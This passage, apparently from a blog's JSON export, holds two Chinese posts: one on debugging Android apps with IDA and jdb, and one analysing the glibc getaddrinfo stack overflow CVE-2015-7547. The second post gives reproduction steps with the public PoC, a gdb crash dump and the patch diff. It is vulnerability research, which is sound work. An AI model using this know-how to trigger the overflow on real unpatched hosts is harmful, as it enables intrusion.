/images/android_debug_analysis4.png\n","slug":"android_debug_analysis","published":1,"updated":"2016-11-03T16:15:44.900Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civ4fjk1t00009c609jxw5dfi","content":"<p>又是一番坎坷的折腾，Android之路刚开始就这么折腾，但好在最后终于能够解决并能给自己一个满意的答案。也是有一次见识到了国内的资料都是转转转的可怕，只是这次也并没有找到相关的英文资料可以解惑，记录在这里算是一点补充，让需要的朋友少走点弯路。</p>\n<a id=\"more\"></a>\n<h2 id=\"姿势总结\"><a href=\"#姿势总结\" class=\"headerlink\" title=\"姿势总结\"></a>姿势总结</h2><p>首先简单总结下，目前在Android的动态调试主要有这么几种姿势：</p>\n<ul>\n<li><strong>smali插桩</strong><br>较为麻烦的方式,在smali代码中插入自己的代码来做log输出等达到调试的效果</li>\n<li><strong>IDA调试</strong><br>IDA可以支持调试dex和so，但是并不能自由切换，经过尝试，可以通过开两个IDA分别调试dex和so来达到这个效果</li>\n<li><strong>JEB调试</strong><br>2.2.x以上已经支持dex和so的完美调试，但是貌似不能调试so库中的JNI_Onload以及.init中的函数？</li>\n<li><strong>gdb调试</strong><br>gdb+gdbserver 可以用来调试so库</li>\n<li><strong>android studio调试</strong><br>可以调试smali，可以调试ndk但是貌似不能在无源码的情况下调试so，都是通过插件的方式实现的貌似，具体没做尝试</li>\n<li><strong>andbug开源项目</strong><br>貌似不是很好用，忽略</li>\n<li><strong>xposed hook</strong><br>只能进行函数开始和结束地址处的hook？这个也需要尝试一下</li>\n</ul>\n<h2 id=\"原理简介\"><a href=\"#原理简介\" class=\"headerlink\" title=\"原理简介\"></a>原理简介</h2><p>Android上App的调试主要有两个部分，dex的调试或者说VM的调试以及so库代码的调试。而这两个暂时看来是需要两个调试器来完成（或者有哪个调试器同时实现了进程的调试以及JDWP协议来调试VM应该就可以包揽这俩），对于so库代码的调试主要是通过类似gdb ptrace调试的方式来实现，对于VM的调试主要是通过jdwp协议来实现，这个协议是类java虚拟机提供的一个调试接口，Dalvik虚拟机显然也实现了这个接口。而这个JDWP协议应该是通过UNIX域套接字来完成VM与debugger之间的通信的。</p>\n<p>有关JDWP协议adb有些操作需要了解下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">adb jdwp</div></pre></td></tr></table></figure></p>\n<p>列出目标Android系统中支持jdwp协议的进程<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">adb forward tcp:XXX jdwp:XXX</div></pre></td></tr></table></figure></p>\n<p>将本机的端口映射到（通过USB或者端口，取决于本机与目标Android之间建立连接的方式）目标Android的一个jdwp接口上。</p>\n<h2 id=\"关于IDA\"><a href=\"#关于IDA\" class=\"headerlink\" title=\"关于IDA\"></a>关于IDA</h2><p>然后下面主要就是对于IDA的两种调试方式的分析，算是对蒸米大大的《安卓动态调试七种武器之孔雀翎 – Ida Pro》一文的一些补充，能够搜到的相关IDA调试的资料基本都是一样的，就是和蒸米大大这篇一样把步骤列一遍，但是我看的时候却憋得慌，主要的问题就是不明白为什么要在中间插一步jdb，于是相当憋得慌。经过一番考证，终于找到了原因。</p>\n<p>我们先看下IDA调试dex的过程，步骤这里就不列了，一搜一大把，主要看下原理，使用USB连接，当IDA已经连接到VM之后，可以看到：</p>\n<p><img src=\"/images/android_debug_analysis0.png\" alt=\"android_debug_analysis0.png\"></p>\n<p><img src=\"/images/android_debug_analysis1.png\" alt=\"android_debug_analysis1.png\"></p>\n<p>IDA是通过adb建立了一个jdwp转发来调试目标VM，图中的另外一个与adb建立的连接是我开的shell，这个时候也是没有别的连接的，IDA在这个时候并没有通过android_server来进行调试。</p>\n<p>然后我们来重点看下调试so库，在蒸米大大列出的步骤里，说必须要启动ddms，然后还要jdb插一脚，这我果断不能忍，IDA这么6，为什么还需要再额外找东西插一脚？原因是这样的，打开ddms之后，可以看到：</p>\n<p><img src=\"/images/android_debug_analysis2.png\" alt=\"android_debug_analysis2.png\"></p>\n<p><img src=\"/images/android_debug_analysis3.png\" alt=\"android_debug_analysis3.png\"></p>\n<p>ddms建立了一堆连接与监听，所以之后的那个jdb connect是连接到了java然后通过java处理再通过adb来与目标VM建立调试通信，所以如果没有开ddms，localhost没有这些监听端口你connect到127.0.0.1:8700自然没有办法attach到目标VM上，这算是解决了问题1。下面是问题2，为什么需要jdb插一脚，在IDA开始调试so库后我们可以看到它这次是直接与android_server进行通信：</p>\n<p><img src=\"/images/android_debug_analysis4.png\" alt=\"android_debug_analysis4.png\"></p>\n<p>没有与jdwp进行连接，所以这个时候由于是debug方式启动的app，VM还在等待jdwp发过来的信号而暂停，只能通过jdb来让它继续运行（所以android_server实现的还不够完美？）。那有没有办法不让jdb插一脚呢？我猜想双开IDA，一个调DEX，一个调so应该可以做到，尝试之后证明这样确实没有问题，于是到这里问题2也终于有了答案，我心中的一口淤血也算是终于吐出来了。</p>\n<p>也希望能让诸位看官对这个答案感到满意。</p>\n<h2 id=\"一些坑\"><a href=\"#一些坑\" class=\"headerlink\" title=\"一些坑\"></a>一些坑</h2><p>最后是一些坑，我在这里折腾了整整两天，除去jdb这里的疑惑之外，另一个阻拦我的问题也终于能够解决，其实如果我能先把蒸米大大对于Alicrackme_2.apk的分析看完的话根本就不会遇到那个另一个问题，然而我以为对那个apk的分析到IDA调试就完了…谁知道那个apk是有反调试的！坑啊，我一开始怎么也进不去so库中的调试，还以为是IDA在wine下运行的问题，又试了windows下的IDA，jeb也不行，我也试了windows下的，然后又各种排除，一开始有那么一瞬想到是不是apk怎么样，但是就那么一瞬一闪而过，想拿jeb官方演示的apk看看但是没找到就想算了小小的crackme2能有什么问题…我真的是懵逼的啊后来发现这个反调试的trick的时候，这样很多东西都全部都能说通了，比如为什么jeb已经出来两个debugger了却不能调试so，比如IDA为什么只能调试JNI_onload却不能断在后面的check函数里，还是too naive啊…</p>\n<p>但还是有些其他的坑：<br>1、IDA调试so库的时候不能使用adb远程连接，只能使用USB否则IDA老是崩，我不确定是不是因为wine的缘故因为还没验证<br>2、IDA调试so的时候，在已经attach之后需要重新确认下debug option中的断在lib加载处是否还勾着，我这里即便之前勾上了attach之后就没了需要重新勾一下</p>\n<p>最后就是关于jeb的资料还太少，不过貌似jeb不能调试.init和JNI_onload，因为即便我断在lib中也不会停下，不知道是不是还有什么姿势，我翻遍了jeb也没看到什么相关的内容，有知道的朋友吗？不胜感激～</p>\n","excerpt":"<p>又是一番坎坷的折腾，Android之路刚开始就这么折腾，但好在最后终于能够解决并能给自己一个满意的答案。也是有一次见识到了国内的资料都是转转转的可怕，只是这次也并没有找到相关的英文资料可以解惑，记录在这里算是一点补充，让需要的朋友少走点弯路。</p>","more":"<h2 id=\"姿势总结\"><a href=\"#姿势总结\" class=\"headerlink\" title=\"姿势总结\"></a>姿势总结</h2><p>首先简单总结下，目前在Android的动态调试主要有这么几种姿势：</p>\n<ul>\n<li><strong>smali插桩</strong><br>较为麻烦的方式,在smali代码中插入自己的代码来做log输出等达到调试的效果</li>\n<li><strong>IDA调试</strong><br>IDA可以支持调试dex和so，但是并不能自由切换，经过尝试，可以通过开两个IDA分别调试dex和so来达到这个效果</li>\n<li><strong>JEB调试</strong><br>2.2.x以上已经支持dex和so的完美调试，但是貌似不能调试so库中的JNI_Onload以及.init中的函数？</li>\n<li><strong>gdb调试</strong><br>gdb+gdbserver 可以用来调试so库</li>\n<li><strong>android studio调试</strong><br>可以调试smali，可以调试ndk但是貌似不能在无源码的情况下调试so，都是通过插件的方式实现的貌似，具体没做尝试</li>\n<li><strong>andbug开源项目</strong><br>貌似不是很好用，忽略</li>\n<li><strong>xposed hook</strong><br>只能进行函数开始和结束地址处的hook？这个也需要尝试一下</li>\n</ul>\n<h2 id=\"原理简介\"><a href=\"#原理简介\" class=\"headerlink\" title=\"原理简介\"></a>原理简介</h2><p>Android上App的调试主要有两个部分，dex的调试或者说VM的调试以及so库代码的调试。而这两个暂时看来是需要两个调试器来完成（或者有哪个调试器同时实现了进程的调试以及JDWP协议来调试VM应该就可以包揽这俩），对于so库代码的调试主要是通过类似gdb ptrace调试的方式来实现，对于VM的调试主要是通过jdwp协议来实现，这个协议是类java虚拟机提供的一个调试接口，Dalvik虚拟机显然也实现了这个接口。而这个JDWP协议应该是通过UNIX域套接字来完成VM与debugger之间的通信的。</p>\n<p>有关JDWP协议adb有些操作需要了解下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">adb jdwp</div></pre></td></tr></table></figure></p>\n<p>列出目标Android系统中支持jdwp协议的进程<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">adb forward tcp:XXX jdwp:XXX</div></pre></td></tr></table></figure></p>\n<p>将本机的端口映射到（通过USB或者端口，取决于本机与目标Android之间建立连接的方式）目标Android的一个jdwp接口上。</p>\n<h2 id=\"关于IDA\"><a href=\"#关于IDA\" class=\"headerlink\" title=\"关于IDA\"></a>关于IDA</h2><p>然后下面主要就是对于IDA的两种调试方式的分析，算是对蒸米大大的《安卓动态调试七种武器之孔雀翎 – Ida Pro》一文的一些补充，能够搜到的相关IDA调试的资料基本都是一样的，就是和蒸米大大这篇一样把步骤列一遍，但是我看的时候却憋得慌，主要的问题就是不明白为什么要在中间插一步jdb，于是相当憋得慌。经过一番考证，终于找到了原因。</p>\n<p>我们先看下IDA调试dex的过程，步骤这里就不列了，一搜一大把，主要看下原理，使用USB连接，当IDA已经连接到VM之后，可以看到：</p>\n<p><img src=\"/images/android_debug_analysis0.png\" alt=\"android_debug_analysis0.png\"></p>\n<p><img src=\"/images/android_debug_analysis1.png\" alt=\"android_debug_analysis1.png\"></p>\n<p>IDA是通过adb建立了一个jdwp转发来调试目标VM，图中的另外一个与adb建立的连接是我开的shell，这个时候也是没有别的连接的，IDA在这个时候并没有通过android_server来进行调试。</p>\n<p>然后我们来重点看下调试so库，在蒸米大大列出的步骤里，说必须要启动ddms，然后还要jdb插一脚，这我果断不能忍，IDA这么6，为什么还需要再额外找东西插一脚？原因是这样的，打开ddms之后，可以看到：</p>\n<p><img src=\"/images/android_debug_analysis2.png\" alt=\"android_debug_analysis2.png\"></p>\n<p><img src=\"/images/android_debug_analysis3.png\" alt=\"android_debug_analysis3.png\"></p>\n<p>ddms建立了一堆连接与监听，所以之后的那个jdb connect是连接到了java然后通过java处理再通过adb来与目标VM建立调试通信，所以如果没有开ddms，localhost没有这些监听端口你connect到127.0.0.1:8700自然没有办法attach到目标VM上，这算是解决了问题1。下面是问题2，为什么需要jdb插一脚，在IDA开始调试so库后我们可以看到它这次是直接与android_server进行通信：</p>\n<p><img src=\"/images/android_debug_analysis4.png\" alt=\"android_debug_analysis4.png\"></p>\n<p>没有与jdwp进行连接，所以这个时候由于是debug方式启动的app，VM还在等待jdwp发过来的信号而暂停，只能通过jdb来让它继续运行（所以android_server实现的还不够完美？）。那有没有办法不让jdb插一脚呢？我猜想双开IDA，一个调DEX，一个调so应该可以做到，尝试之后证明这样确实没有问题，于是到这里问题2也终于有了答案，我心中的一口淤血也算是终于吐出来了。</p>\n<p>也希望能让诸位看官对这个答案感到满意。</p>\n<h2 id=\"一些坑\"><a href=\"#一些坑\" class=\"headerlink\" title=\"一些坑\"></a>一些坑</h2><p>最后是一些坑，我在这里折腾了整整两天，除去jdb这里的疑惑之外，另一个阻拦我的问题也终于能够解决，其实如果我能先把蒸米大大对于Alicrackme_2.apk的分析看完的话根本就不会遇到那个另一个问题，然而我以为对那个apk的分析到IDA调试就完了…谁知道那个apk是有反调试的！坑啊，我一开始怎么也进不去so库中的调试，还以为是IDA在wine下运行的问题，又试了windows下的IDA，jeb也不行，我也试了windows下的，然后又各种排除，一开始有那么一瞬想到是不是apk怎么样，但是就那么一瞬一闪而过，想拿jeb官方演示的apk看看但是没找到就想算了小小的crackme2能有什么问题…我真的是懵逼的啊后来发现这个反调试的trick的时候，这样很多东西都全部都能说通了，比如为什么jeb已经出来两个debugger了却不能调试so，比如IDA为什么只能调试JNI_onload却不能断在后面的check函数里，还是too naive啊…</p>\n<p>但还是有些其他的坑：<br>1、IDA调试so库的时候不能使用adb远程连接，只能使用USB否则IDA老是崩，我不确定是不是因为wine的缘故因为还没验证<br>2、IDA调试so的时候，在已经attach之后需要重新确认下debug option中的断在lib加载处是否还勾着，我这里即便之前勾上了attach之后就没了需要重新勾一下</p>\n<p>最后就是关于jeb的资料还太少，不过貌似jeb不能调试.init和JNI_onload，因为即便我断在lib中也不会停下，不知道是不是还有什么姿势，我翻遍了jeb也没看到什么相关的内容，有知道的朋友吗？不胜感激～</p>"},{"title":"CVE-2015-7547","date":"2016-11-01T18:45:00.000Z","_content":"\nCVE-2015-7547，由google安全团队披露的glibc中getaddrinfo()函数产生的stack overflow漏洞，影响glibc版本2.9-2.22，产生漏洞的原因在于getaddrinfo在进行DNS查询的过程中，调用到send_dg()或者send_vc()的时候，由于逻辑错误导致标识buffer大小的变量和buffer的实际大小出现了不统一，进一步导致stack-overflow的发生。\n\n<!--more-->\n\n[这里](https://github.com/fjserna/CVE-2015-7547)有google团队给出的POC，但是保留了EXP——“We will not release our exploit code, but a non-weaponized Proof of Concept has been made available simultaneously with this blog post”。经过分析来看RCE是可行的，但是还需要去绕过一些保护机制和check。\n\n## 漏洞复现\n\n这个用户态的漏洞还是比较好复现的。首先我们需要获取一份未patch的存在漏洞的glibc，可以从[GNU站点](http://mirror.hust.edu.cn/gnu/libc/)中下载，然后编译安装：\n\n```bash\ntar zxvf glibc-2.19.tar.gz \ncd /glibc-2.19\nmkdir build && cd build\n../configure --prefix=/usr/local/glibc219/ --enable-debug CFLAGS=\"-g -O1\" CPPFLAGS=\"-g -O1\"\nmake\nmake install\n```\n\n在google给出的poc中，一份python用来监控53端口模拟DNS服务器以产生构造的DNS响应包，另一份client简单调用getaddrinfo函数触发漏洞。\n\n我们需要将google给出的poc中的client使用存在漏洞的glibc进行编译，需要参数rpath和dynamic-linker来指定glibc与对应的ld-linux：\n\n```bash\n-Wl,-rpath=/path/to/new/glibc/lib\n-Wl,-dynamic-linker=/path/to/newglibc/ld-linux.so.2\n```\n\n然后修改本地dns服务器为127.0.0.1，对应的配置文件为/etc/resolv.conf。之后分别启动python文件和client，就可以看到崩溃：\n\n```\nroot@Tencent1:~/CVE-2015-7547$ ./client\nSegmentation fault  \n```\n\n可以用gdb确认一下崩溃位置：\n\n```\nroot@Tencent1:~/CVE-2015-7547$ gdb client \nGNU gdb (Debian 7.11.1-2) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from client...(no debugging symbols found)...done.\ngdb-peda$ r\nStarting program: /root/CVE-2015-7547/client \n\nProgram received signal SIGSEGV, Segmentation fault.\n [----------------------------------registers-----------------------------------]\nRAX: 0x7fffffffe2a8 ('B' <repeats 150 times>, \"lrouters\")\nRBX: 0x4242424242424242 ('BBBBBBBB')\nRCX: 0xffffffffffffffff \nRDX: 0x4242424242424242 ('BBBBBBBB')\nRSI: 0x0 \nRDI: 0xffffffff \nRBP: 0x7fffffffd0b0 --> 0x7ffff7ddc080 --> 0x200000001 \nRSP: 0x7fffffffcde0 --> 0x1000001045e \nRIP: 0x7ffff741986c (<__GI___libc_res_nquery+1084>:     movzx  eax,BYTE PTR [rbx+0x3])\nR8 : 0x24 ('$')\nR9 : 0x7fffffffcc68 --> 0x7fffffffda40 --> 0x424242424242de8c \nR10: 0x7fffffffc610 --> 0x0 \nR11: 0x206 \nR12: 0xbcc \nR13: 0x7fffffffe2b0 ('B' <repeats 142 times>, \"lrouters\")\nR14: 0x24 ('$')\nR15: 0x7ffff7ddc080 --> 0x200000001\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7ffff7419859 <__GI___libc_res_nquery+1065>:        lea    rsi,[rip+0x8b29]        # 0x7ffff7422389\n   0x7ffff7419860 <__GI___libc_res_nquery+1072>:        lea    rdi,[rip+0x8b81]        # 0x7ffff74223e8\n   0x7ffff7419867 <__GI___libc_res_nquery+1079>:        call   0x7ffff7415820 <__assert_fail@plt>\n=> 0x7ffff741986c <__GI___libc_res_nquery+1084>:        movzx  eax,BYTE PTR [rbx+0x3]\n   0x7ffff7419870 <__GI___libc_res_nquery+1088>:        and    eax,0xf\n   0x7ffff7419873 <__GI___libc_res_nquery+1091>:        jne    0x7ffff7419a5f <__GI___libc_res_nquery+1583>\n   0x7ffff7419879 <__GI___libc_res_nquery+1097>:        movzx  ecx,WORD PTR [rbx+0x6]\n   0x7ffff741987d <__GI___libc_res_nquery+1101>:        ror    cx,0x8\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffcde0 --> 0x1000001045e \n0008| 0x7fffffffcde8 --> 0x6f6f660300000000 \n0016| 0x7fffffffcdf0 --> 0x6f6f670672616203 \n0024| 0x7fffffffcdf8 --> 0x6d6f6303656c67 \n0032| 0x7fffffffce00 --> 0x1de8c01000100 \n0040| 0x7fffffffce08 --> 0x100 \n0048| 0x7fffffffce10 --> 0x726162036f6f6603 \n0056| 0x7fffffffce18 --> 0x3656c676f6f6706 \n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n__GI___libc_res_nquery (statp=statp@entry=0x7ffff7ddc080 <_res@GLIBC_2.2.5>, name=0x400717 \"foo.bar.google.com\", class=class@entry=0x1, \n    type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 \"\\214\\336\", 'B' <repeats 198 times>..., anslen=anslen@entry=0x800, \n    answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:262\n262             if ((hp->rcode != NOERROR || ntohs(hp->ancount) == 0)\ngdb-peda$ bt\n#0  __GI___libc_res_nquery (statp=statp@entry=0x7ffff7ddc080 <_res@GLIBC_2.2.5>, name=0x400717 \"foo.bar.google.com\", class=class@entry=0x1, \n    type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 \"\\214\\336\", 'B' <repeats 198 times>..., anslen=anslen@entry=0x800, \n    answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:262\n#1  0x00007ffff7419c47 in __libc_res_nquerydomain (statp=statp@entry=0x7ffff7ddc080 <_res@GLIBC_2.2.5>, name=<optimized out>, \n    name@entry=0x400717 \"foo.bar.google.com\", domain=<optimized out>, domain@entry=0x0, class=class@entry=0x1, type=type@entry=0xf371, \n    answer=answer@entry=0x7fffffffda40 \"\\214\\336\", 'B' <repeats 198 times>..., anslen=0x800, answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, \n    nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0) at res_query.c:582\n#2  0x00007ffff7419fbe in __GI___libc_res_nsearch (statp=0x7ffff7ddc080 <_res@GLIBC_2.2.5>, name=name@entry=0x400717 \"foo.bar.google.com\", \n    class=class@entry=0x1, type=type@entry=0xf371, answer=answer@entry=0x7fffffffda40 \"\\214\\336\", 'B' <repeats 198 times>..., \n    anslen=anslen@entry=0x800, answerp=0x7fffffffe2b0, answerp2=0x7fffffffe2a8, nanswerp2=0x7fffffffe2a4, resplen2=0x7fffffffe2a0)\n    at res_query.c:378\n#3  0x00007ffff762b866 in _nss_dns_gethostbyname4_r (name=0x400717 \"foo.bar.google.com\", pat=0x4242424242424242, \n    buffer=0x4242424242424242 <error: Cannot access memory at address 0x4242424242424242>, buflen=0x4242424242424242, errnop=0x7fffffffe8ac, herrnop=0x7fffffffe880, ttlp=0x4242424242424242) at nss_dns/dns-host.c:314\n#4  0x4242424242424242 in ?? ()\n#5  0x4242424242424242 in ?? ()\n#6  0x4242424242424242 in ?? ()\n#7  0x4242424242424242 in ?? ()\n#8  0x4242424242424242 in ?? ()\n#9  0x4242424242424242 in ?? ()\n#10 0x4242424242424242 in ?? ()\n#11 0x4242424242424242 in ?? ()\n#12 0x726c424242424242 in ?? ()\n#13 0x000073726574756f in ?? ()\n#14 0x0000000000000000 in ?? ()\ngdb-peda$ \n\n```\n\n\n\n## 具体分析\n\n从gdb看到的调用栈可以看出，崩溃的调用栈是这样的：\n\n```\ngetaddrinfo() \t/sysdeps/posix/getaddrinfo.c\n|\ngaih_inet()\t\t/sysdeps/posix/getaddrinfo.c\n|\ngethostbyname4_r()\t/resolv/nss_dns/dns-host.c\n|\n__libc_res_nsearch()\t/resolv/res_query.c\n|\n__libc_res_nquerydomain()\t/resolv/res_query.c\n|\n__libc_res_nquery()\t\t/resolv/res_query.c\n|\n__libc_res_nsend()\t\t/resolv/res_send.c\n|\nsend_dg()\t/resolv/res_send.c\n(send_vc()\t/resolv/res_send.c)\n\n```\n\n其中，我们给`getaddrinfo`函数传入的hints参数中，其ai_family为AF_UNSPEC，这个参数使得`getaddrinfo`在后来会调用`gethostbyname4_r()`来进行IPV4与IPV6的DNS的并发查询。我们要关注的重点就是`gethostbyname4_r()`、`__libc_res_nsend()`、`send_dg()`。漏洞发生在`send_dg`函数中。\n\n函数调用栈中相关的变量关系大概是这样，我觉得搞明白这些变量的意义对于理解这个洞比较关键，但这些变量命名还是挺乱的，我们之后会逐步理清。另外还有一点是关于DNS的基础也是理解的前题，就是DNS一般来说是使用UDP进行请求与响应的，但是如果数据内容大于512bytes（取决于配置），DNS服务器在返回数据包中将会置位truncated flag，然后client将会重新使用TCP来进行本次DNS请求（当然也可以配置只使用TCP）。\n\n![cve_2015_7547_0.png](/images/cve_2015_7547_0.png)\n\n首先，`gethostbynamr4_r()`首先在栈上用alloca分配了2048 bytes的空间，同时也定义了ans2p、nans2p、resplen2，这几个变量是用于标识第二个数据包（因为我们需要发送IPV4和IPV6两个DNS请求，因此是有两个数据包，如果使用TCP的DNS请求的响应也分为两次回应的话）的在buffer中的位置、buffer大小以及对应response的大小。相关代码：\n\n```C\n 301   union\n 302   {\n 303     querybuf *buf;\n 304     u_char *ptr;\n 305   } host_buffer;\n 306   querybuf *orig_host_buffer;\n 307   host_buffer.buf = orig_host_buffer = (querybuf *) alloca (2048); \n 308   u_char *ans2p = NULL;\n 309   int nans2p = 0;\n 310   int resplen2 = 0;\n 311 \n 312   int olderr = errno;\n 313   enum nss_status status;\n 314   int n = __libc_res_nsearch (&_res, name, C_IN, T_UNSPEC,\n 315                   host_buffer.buf->buf, 2048, &host_buffer.ptr,\n 316                   &ans2p, &nans2p, &resplen2);\n```\n\n之后一路调用到`__libc_res_nsend`，这个函数用于调用（或者是反复调用）`send_dg`（处理UDP数据包的发送与接收）与`send_vc`（处理TCP数据包的发送与接收）来完成DNS查询，也就是说`send_dg`和`send_vc`只负责单次的DNS请求（但是这个单次不一定就是只有一个数据包，根据需要IPV4还是IPV6还是都需要来决定 ，如果都需要就会在一次调用中完成IPV4与IPV6数据的请求与接收），如果出了什么问题比如timeout或者truncated都会直接返回由`__libc_res_nsend`来决定是否继续发送及使用什么方式发送。\n\n现在我们可以来看`send_dg`函数中产生漏洞的地方，`send_dg`函数主要是完成了数据包的发送与接收，漏洞出在接收数据包的代码中，我们可以跳过无关的发送代码。首先是定义了一些局部变量：\n\n```C\n1191         int *thisanssizp;\n1192         u_char **thisansp;\n1193         int *thisresplenp;\n```\n\n这三个变量用于标识用于接收当前数据包（IPV4的或IPV6）的buffer信息，分别是buffer大小、buffer指针、response长度。我们当前的情况是需要接收两个数据包，IPV4的查询响应与IPV6的查询响应，当接收第一个包的时候，if条件满足（buf2指向之前要发送的第二个数据包buffer，这里用来判断是否只需要接收一个包即可），进入这一段：\n\n```C\n1194 \n1195         if ((recvresp1 | recvresp2) == 0 || buf2 == NULL) {\n1196             thisanssizp = anssizp;\n1197             thisansp = anscp ?: ansp;\n1198             assert (anscp != NULL || ansp2 == NULL);\n1199             thisresplenp = &resplen;\n1200         } else {\n```\n\n这一段代码是没有问题的，直接使用了传进来的stack中的2048bytes的buffer去接收数据。但是如果这个2048 bytes的buffer不够，会进入下一段代码使用malloc分配64k的空间进行接收：\n\n```C\n1228         if (*thisanssizp < MAXPACKET\n1229             /* Yes, we test ANSCP here.  If we have two buffers\n1230                both will be allocatable.  */\n1231             && anscp\n1232 #ifdef FIONREAD\n1233             && (ioctl (pfd[0].fd, FIONREAD, thisresplenp) < 0\n1234             || *thisanssizp < *thisresplenp)\n1235 #endif\n1236                     ) {\n1237             u_char *newp = malloc (MAXPACKET);\n1238             if (newp != NULL) {\n1239                 *anssizp = MAXPACKET;\n1240                 *thisansp = ans = newp;\n1241             }\n1242         }\n```\n\n其实单单看这一段代码是没有问题的，从对这个漏洞的patch也可以看出，只不过是换了一个host_buffer的指针去修改host_bufer指向newp，本质上在这里其实并没有什么改变：\n\n```C\n-\t\t\t\t*anssizp = MAXPACKET;\n-\t\t\t\t*thisansp = ans = newp;\n+\t\t\t\t*thisanssizp = MAXPACKET;\n+\t\t\t\t*thisansp = newp;\n```\n\n其实问题是这样产生的，从上面给出的变量图可以看到，这里是想要host_buffer指向新的buffer以及修改anssiz来反映这个buffer的大小变化，然后让`__libc_res_nsend`中的ans依然指向2048bytes因为如果第二个数据包比较小还依然能存在栈中，这个意图没有问题，实际上问题出在下面的关于准备第二个数据包的buffer相关变量中：\n\n```C\n1200         } else {\n1201             if (*anssizp != MAXPACKET) {\n1202                 /* No buffer allocated for the first\n1203                    reply.  We can try to use the rest\n1204                    of the user-provided buffer.  */\n1205 #ifdef _STRING_ARCH_unaligned\n1206                 *anssizp2 = orig_anssizp - resplen;\n1207                 *ansp2 = *ansp + resplen;\n1208 #else\n...\t\t\t\t\t[...]\n1214 #endif\n1215             } else {\n1216                 /* The first reply did not fit into the\n1217                    user-provided buffer.  Maybe the second\n1218                    answer will.  */\n1219                 *anssizp2 = orig_anssizp;\n1220                 *ansp2 = *ansp;\n1221             }\n1222 \n1223             thisanssizp = anssizp2;\n1224             thisansp = ansp2;\n1225             thisresplenp = resplen2;\n1226         }\n```\n\n问题是出在关于orig_anssizp变量的处理上，这个变量是在`send_dg`一开始这样赋值的：\n\n```C\n1000     int orig_anssizp = *anssizp;\n```\n\n结合第二个数据包的buffer准备就可以看到问题了，本来用来标识64k的heap中的buffer大小的变量却被用来标志2048bytes的栈buffer的大小，然后传递给`recvfrom`来接受数据：\n\n```C\n1246         *thisresplenp = recvfrom(pfd[0].fd, (char*)*thisansp,\n1247                      *thisanssizp, 0,\n1248                     (struct sockaddr *)&from, &fromlen);\n```\n\n这个时候一旦接个大的数据包就有问题了，stack-overflow就产生了。从patch中也可以证明：\n\n```C\n-\tint orig_anssizp = *anssizp;\n```\n\n以及\n\n```C\n@@ -1154,50 +1123,48 @@ send_dg(res_state statp,\n \t\t\tassert (anscp != NULL || ansp2 == NULL);\n \t\t\tthisresplenp = &resplen;\n \t\t} else {\n-\t\t\tif (*anssizp != MAXPACKET) {\n-\t\t\t\t/* No buffer allocated for the first\n-\t\t\t\t   reply.  We can try to use the rest\n-\t\t\t\t   of the user-provided buffer.  */\n-#if _STRING_ARCH_unaligned\n-\t\t\t\t*anssizp2 = orig_anssizp - resplen;\n-\t\t\t\t*ansp2 = *ansp + resplen;\n-#else\n-\t\t\t\tint aligned_resplen\n-\t\t\t\t  = ((resplen + __alignof__ (HEADER) - 1)\n-\t\t\t\t     & ~(__alignof__ (HEADER) - 1));\n-\t\t\t\t*anssizp2 = orig_anssizp - aligned_resplen;\n-\t\t\t\t*ansp2 = *ansp + aligned_resplen;\n-#endif\n-\t\t\t} else {\n-\t\t\t\t/* The first reply did not fit into the\n-\t\t\t\t   user-provided buffer.  Maybe the second\n-\t\t\t\t   answer will.  */\n-\t\t\t\t*anssizp2 = orig_anssizp;\n-\t\t\t\t*ansp2 = *ansp;\n-\t\t\t}\n-\n \t\t\tthisanssizp = anssizp2;\n \t\t\tthisansp = ansp2;\n \t\t\tthisresplenp = resplen2;\n \t\t}\n```\n\n可以看出patch的主要思路就是直接删除了在接受第二个数据包的时候对于栈上的buffer的考虑。\n\n`send_vc`中接受数据包的buffer处理基本和`send_dg`相同。所以我们也就可以理清POC中的利用思路，首先先是UDP请求IPV4和IPV6的DNS响应，然后服务器返回一个较大的响应包并设置truncated flag，这个时候send_dg中接受到这个包看到TC标志就立刻设置相关变量并返回使得`__libc_res_nsend`使用`send_vc`继续（所以我觉得POC中的等到接受到再一次的TCP请求再将之前的UDP包返回来我是没搞明白其意义，这个时候client应该不会再理会这第二个UDP响应了，我尝试修改poc试了一下也确实没有问题，难道poc中这么做只是为了避免client可能的等待？），然后由于orig_anssizp的关系，第一个数据包使用栈中的buffer接受了，但是第二个大数据包到来的时候因为orig_anssizp太大而计算size错误导致了溢出。\n\n## 